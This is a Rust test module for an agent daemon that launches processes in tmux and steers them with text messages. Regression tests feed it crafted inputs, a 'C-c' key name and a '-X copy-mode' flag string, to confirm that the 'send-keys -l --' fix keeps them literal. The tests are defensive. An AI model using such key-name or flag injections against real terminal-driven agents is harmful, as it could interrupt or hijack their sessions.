/// `pub(crate)` on purpose — it accepts an arbitrary program and would
/// otherwise let any downstream caller bypass `agent_command()`'s
/// four-identity allowlist. A test's convenience is not a reason to widen a
/// security boundary; the test moves to the code instead.
///
/// `ExecutionProxy::spawn_agent` only accepts one of the four canonical agent
/// identities, so there is no way to make it launch a scripted `sh -c '...'`
/// test double — calling `spawn_via_tmux` directly is the only way to drive a
/// controllable process through the same tmux launch/capture/teardown
/// machinery a real agent spawn uses. `spawn_via_tmux` follows a documented
/// find-only contract against `DaemonState.active_agents` (it updates an
/// existing entry's `status`/`logs`, it never inserts one), and `spawn_agent`
/// — its only production caller — registers the `AgentProcess` *before*
/// delegating to it. This test mirrors that same register-then-spawn
/// sequence, matching how the two are actually meant to be composed.
///
/// Windows-excluded: every test in this module drives a real tmux session,
/// and `spawn_via_tmux` has no Windows implementation (tmux itself has none).
#[cfg(all(test, not(windows)))]
mod integration_tests {
    use super::{AgentProcess, ExecutionProxy};
    use crate::daemon::state::DaemonState;
    use std::sync::Arc;
    use std::time::SystemTime;
    use tokio::sync::RwLock;

    #[tokio::test]
    async fn spawn_then_steer_full_roundtrip() {
        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        // Mirrors what `spawn_agent` does before delegating to
        // `spawn_via_tmux`: register the agent as "Running" so `steer_agent`
        // (which only steers known, running agents) can find it.
        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "sh".to_string(),
                status: "Running".to_string(),
                started_at: SystemTime::now(),
                logs: Vec::new(),
            });
        }

        proxy
            .spawn_via_tmux(
                id,
                "sh",
                &[
                    "-c".to_string(),
                    "read line; echo \"GOT:$line\"; sleep 3".to_string(),
                ],
                ".",
                10,
            )
            .await
            .expect("spawn should succeed");

        tokio::time::sleep(std::time::Duration::from_millis(500)).await;

        proxy
            .steer_agent(id, "integration-test-message", "claude_kaira")
            .await
            .expect("steer should succeed");

        let mut ok = false;
        for _ in 0..40 {
            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                if agent
                    .logs
                    .iter()
                    .any(|l| l.contains("GOT:integration-test-message"))
                {
                    ok = true;
                    break;
                }
            }
        }

        // Same cleanup this module's other tmux `#[tokio::test]`s apply and
        // document: the assertion above wins the race against the pane's own
        // `sleep 3` and the 10s Death Timer, so `#[tokio::test]`'s per-test
        // runtime drops `spawn_via_tmux`'s still-sleeping
        // exit-status/kill-session background task before it reaches its own
        // cleanup. Kill the session (and its pipe-pane logfile) explicitly
        // rather than leaking a live tmux session on every run.
        let session = super::tmux_session_name(id);
        let _ = tokio::process::Command::new("tmux")
            .args(["kill-session", "-t", &session])
            .status()
            .await;
        let _ = tokio::fs::remove_file(
            std::env::temp_dir()
                .join("raios-agent-logs")
                .join(format!("{session}.log")),
        )
        .await;

        assert!(
            ok,
            "full spawn -> steer -> captured-output roundtrip failed"
        );
    }

    /// I1 regression guard: with `send-keys -l --`, a message of exactly
    /// `C-c` must be delivered as the literal three characters, not as a real
    /// Ctrl-C that kills the pane. Without `-l`, tmux parses the message as
    /// key names — turning a text-injection feature into an undocumented
    /// remote-interrupt primitive, with the audit ledger recording the raw
    /// string as if it were harmless text.
    #[tokio::test]
    async fn steer_sends_control_sequence_looking_message_as_literal_text() {
        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "sh".to_string(),
                status: "Running".to_string(),
                started_at: SystemTime::now(),
                logs: Vec::new(),
            });
        }

        proxy
            .spawn_via_tmux(
                id,
                "sh",
                &[
                    "-c".to_string(),
                    "read line; echo \"LITERAL:$line\"; sleep 5".to_string(),
                ],
                ".",
                15,
            )
            .await
            .expect("spawn should succeed");

        tokio::time::sleep(std::time::Duration::from_millis(500)).await;

        proxy
            .steer_agent(id, "C-c", "claude_kaira")
            .await
            .expect("steer with a key-name-looking message should succeed");

        let mut echoed_literally = false;
        for _ in 0..40 {
            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                if agent.logs.iter().any(|l| l.contains("LITERAL:C-c")) {
                    echoed_literally = true;
                    break;
                }
            }
        }

        let session = super::tmux_session_name(id);
        // The session must still be alive: an un-flagged send-keys would have
        // delivered a real SIGINT and killed the pane's `sh`.
        let still_alive = tokio::process::Command::new("tmux")
            .args(["has-session", "-t", &session])
            .status()
            .await
            .map(|s| s.success())
            .unwrap_or(false);

        let _ = tokio::process::Command::new("tmux")
            .args(["kill-session", "-t", &session])
            .status()
            .await;
        let _ = tokio::fs::remove_file(
            std::env::temp_dir()
                .join("raios-agent-logs")
                .join(format!("{session}.log")),
        )
        .await;

        assert!(
            echoed_literally,
            "expected 'C-c' to arrive as literal text, echoed back as LITERAL:C-c"
        );
        assert!(
            still_alive,
            "steering 'C-c' must not interrupt/kill the target session"
        );
    }

    /// I1's other half: a message beginning with `-` is otherwise eaten by
    /// tmux's own getopt (`-X` is a real `send-keys` flag) and the send
    /// fails. The `--` end-of-options separator is what makes it text.
    #[tokio::test]
    async fn steer_sends_dash_prefixed_message_without_tmux_parsing_it_as_a_flag() {
        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());
        let id = uuid::Uuid::new_v4();

        {
            let mut state_lock = state.write().await;
            state_lock.active_agents.push(AgentProcess {
                id,
                name: "sh".to_string(),
                status: "Running".to_string(),
                started_at: SystemTime::now(),
                logs: Vec::new(),
            });
        }

        proxy
            .spawn_via_tmux(
                id,
                "sh",
                &[
                    "-c".to_string(),
                    "read line; echo \"DASH:$line\"; sleep 5".to_string(),
                ],
                ".",
                15,
            )
            .await
            .expect("spawn should succeed");

        tokio::time::sleep(std::time::Duration::from_millis(500)).await;

        let steer_result = proxy.steer_agent(id, "-X copy-mode", "claude_kaira").await;

        let mut found = false;
        for _ in 0..40 {
            tokio::time::sleep(std::time::Duration::from_millis(200)).await;
            let s = state.read().await;
            if let Some(agent) = s.active_agents.iter().find(|a| a.id == id) {
                if agent.logs.iter().any(|l| l.contains("DASH:-X copy-mode")) {
                    found = true;
                    break;
                }
            }
        }

        let session = super::tmux_session_name(id);
        let _ = tokio::process::Command::new("tmux")
            .args(["kill-session", "-t", &session])
            .status()
            .await;
        let _ = tokio::fs::remove_file(
            std::env::temp_dir()
                .join("raios-agent-logs")
                .join(format!("{session}.log")),
        )
        .await;

        steer_result.expect("a '-'-prefixed message must not be parsed as a tmux flag");
        assert!(
            found,
            "expected '-X copy-mode' to arrive as literal text, echoed back as DASH:-X copy-mode"
        );
    }
}
